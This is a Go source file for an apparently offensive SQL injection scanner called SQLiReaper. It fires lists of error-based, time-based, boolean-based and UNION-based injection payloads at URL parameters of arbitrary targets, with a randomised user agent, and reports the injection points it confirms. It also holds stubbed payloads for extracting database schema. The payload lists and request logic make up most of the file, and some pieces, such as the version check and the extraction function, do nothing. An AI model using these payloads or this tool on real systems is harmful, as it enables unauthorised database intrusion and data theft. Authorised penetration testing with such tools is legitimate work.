package web

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	"github.com/nexus-void/nexus-void/pkg/utils"
)

// SQLiReaper is the main SQL injection testing engine
type SQLiReaper struct {
	Target    string
	Timeout   time.Duration
	UserAgent string
}

// SQLiResult represents a confirmed SQL injection finding
type SQLiResult struct {
	URL        string `json:"url"`
	Parameter  string `json:"parameter"`
	Type       string `json:"type"` // union, error, boolean, time, stacked, oob
	Payload    string `json:"payload"`
	Database   string `json:"database"`
	Version    string `json:"version"`
	User       string `json:"user"`
	Proof      string `json:"proof"`
	Severity   string `json:"severity"`
	Confidence int    `json:"confidence"` // 0-100
}

func NewSQLiReaper(target string) *SQLiReaper {
	return &SQLiReaper{
		Target:    target,
		Timeout:   30 * time.Second,
		UserAgent: utils.RandomUserAgent(),
	}
}

// TestURL tests a URL with various SQL injection payloads
func (s *SQLiReaper) TestURL(targetURL string, params []string) []SQLiResult {
	fmt.Printf("[+] SQLi-REAPER scanning: %s\n", targetURL)

	var results []SQLiResult

	if len(params) == 0 {
		params = s.discoverParameters(targetURL)
	}

	for _, param := range params {
		// Test error-based SQLi
		if r := s.testErrorBased(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test time-based SQLi
		if r := s.testTimeBased(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test boolean-based SQLi
		if r := s.testBooleanBased(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}

		// Test UNION-based SQLi
		if r := s.testUnionBased(targetURL, param); r != nil {
			results = append(results, *r)
			continue
		}
	}

	fmt.Printf("[+] SQLi-REAPER found %d injection points\n", len(results))
	return results
}

func (s *SQLiReaper) discoverParameters(targetURL string) []string {
	// Parse URL and extract query parameters
	u, err := url.Parse(targetURL)
	if err != nil {
		return []string{"id", "page", "user", "cat", "product", "item", "news", "article"}
	}

	var params []string
	for key := range u.Query() {
		params = append(params, key)
	}

	if len(params) == 0 {
		return []string{"id", "page", "user", "cat", "product", "item", "news", "article", "search", "q", "query"}
	}

	return params
}

func (s *SQLiReaper) testErrorBased(targetURL, param string) *SQLiResult {
	errorPayloads := []string{
		"'",
		"''",
		"\\'",
		`"`,
		`""`,
		")",
		"))",
		"' OR '1'='1",
		"' AND 1=1--",
		"' AND 1=2--",
		"' UNION SELECT NULL--",
		"1' AND 1=1--",
		"1' AND 1=2--",
		"1' ORDER BY 100--",
	}

	sqlErrors := []string{
		"sql syntax",
		"mysql_fetch",
		"mysqli_",
		"pg_query",
		"ora-",
		"pl/sql",
		"sqlite_",
		"syntax error",
		"unclosed quotation mark",
		"incorrect syntax",
		"warning: mysql",
		"sqlserver",
		"odbc",
		"jdbc",
		"psycopg",
	}

	for _, payload := range errorPayloads {
		injectedURL := injectPayload(targetURL, param, payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := strings.ToLower(string(body))

		// Check for SQL error messages
		for _, errPattern := range sqlErrors {
			if strings.Contains(bodyStr, errPattern) {
				return &SQLiResult{
					URL:        targetURL,
					Parameter:  param,
					Type:       "error-based",
					Payload:    payload,
					Proof:      fmt.Sprintf("SQL error detected: %s", errPattern),
					Severity:   "critical",
					Confidence: 95,
				}
			}
		}
	}

	return nil
}

func (s *SQLiReaper) testTimeBased(targetURL, param string) *SQLiResult {
	timePayloads := []struct {
		payload string
		delay   time.Duration
	}{
		{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5 * time.Second},
		{"' AND 1=IF(2>1,SLEEP(5),0)--", 5 * time.Second},
		{";WAITFOR DELAY '0:0:5'--", 5 * time.Second},
		{"' AND pg_sleep(5)--", 5 * time.Second},
		{"' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", 5 * time.Second},
		{"'||dbms_pipe.receive_message(('a'),5)||'", 5 * time.Second},
		{"' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5('test'))))a)--", 3 * time.Second},
	}

	for _, tp := range timePayloads {
		injectedURL := injectPayload(targetURL, param, tp.payload)

		start := time.Now()
		resp, err := utils.Fetch(injectedURL, nil)
		elapsed := time.Since(start)

		if err != nil {
			continue
		}
		resp.Body.Close()

		// If response took significantly longer, it's likely time-based SQLi
		if elapsed > tp.delay {
			return &SQLiResult{
				URL:        targetURL,
				Parameter:  param,
				Type:       "time-based",
				Payload:    tp.payload,
				Proof:      fmt.Sprintf("Response delay: %v (expected: %v)", elapsed, tp.delay),
				Severity:   "critical",
				Confidence: 90,
			}
		}
	}

	return nil
}

func (s *SQLiReaper) testBooleanBased(targetURL, param string) *SQLiResult {
	// Compare TRUE vs FALSE conditions
	truePayloads := []string{
		"' AND '1'='1",
		"' AND 1=1--",
		"' OR '1'='1",
	}
	falsePayloads := []string{
		"' AND '1'='2",
		"' AND 1=2--",
		"' AND 'x'='y",
	}

	// Get baseline
	baselineResp, err := utils.Fetch(targetURL, nil)
	if err != nil {
		return nil
	}
	baselineBody, _ := io.ReadAll(baselineResp.Body)
	baselineResp.Body.Close()
	baselineLen := len(baselineBody)

	for i := 0; i < len(truePayloads) && i < len(falsePayloads); i++ {
		trueURL := injectPayload(targetURL, param, truePayloads[i])
		falseURL := injectPayload(targetURL, param, falsePayloads[i])

		// Test true condition
		trueResp, err := utils.Fetch(trueURL, nil)
		if err != nil {
			continue
		}
		trueBody, _ := io.ReadAll(trueResp.Body)
		trueResp.Body.Close()

		// Test false condition
		falseResp, err := utils.Fetch(falseURL, nil)
		if err != nil {
			continue
		}
		falseBody, _ := io.ReadAll(falseResp.Body)
		falseResp.Body.Close()

		// If true and false produce different results, it's boolean-based SQLi
		trueLen := len(trueBody)
		falseLen := len(falseBody)

		if abs(trueLen-falseLen) > abs(baselineLen-trueLen)+50 {
			return &SQLiResult{
				URL:        targetURL,
				Parameter:  param,
				Type:       "boolean-based",
				Payload:    truePayloads[i],
				Proof:      fmt.Sprintf("True response: %d bytes, False response: %d bytes", trueLen, falseLen),
				Severity:   "critical",
				Confidence: 85,
			}
		}
	}

	return nil
}

func (s *SQLiReaper) testUnionBased(targetURL, param string) *SQLiResult {
	unionPayloads := []string{
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL,NULL--",
		"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
		"' UNION SELECT 'nexus','void'--",
		"' UNION SELECT @@version,NULL--",
		"1' UNION SELECT 1,@@version,3--",
	}

	for _, payload := range unionPayloads {
		injectedURL := injectPayload(targetURL, param, payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check for version string in response
		if strings.Contains(bodyStr, "nexus") && strings.Contains(bodyStr, "void") {
			return &SQLiResult{
				URL:        targetURL,
				Parameter:  param,
				Type:       "union-based",
				Payload:    payload,
				Proof:      "UNION SELECT 'nexus','void' reflected in response",
				Severity:   "critical",
				Confidence: 95,
			}
		}

		// Check for database version
		versionPatterns := []string{
			"5.", "8.", "10.", "MariaDB", "MySQL", "PostgreSQL", "Oracle", "Microsoft SQL Server",
		}
		for _, vp := range versionPatterns {
			if strings.Contains(bodyStr, vp) && resp.StatusCode == 200 {
				// Might be a version leak
				_ = vp
			}
		}
	}

	return nil
}

// AutoExtractSchema attempts to extract database schema via SQLi
func (s *SQLiReaper) AutoExtractSchema(targetURL, param, dbType string) (map[string][]string, error) {
	schema := make(map[string][]string)

	// This is a simplified version - real implementation would use
	// advanced UNION-based extraction or error-based extraction
	fmt.Printf("[+] Attempting schema extraction from: %s\n", targetURL)

	// Try to extract table names (simplified)
	tablePayloads := map[string][]string{
		"mysql": {
			"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
		},
		"postgresql": {
			"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--",
		},
	}

	_ = tablePayloads

	return schema, nil
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}
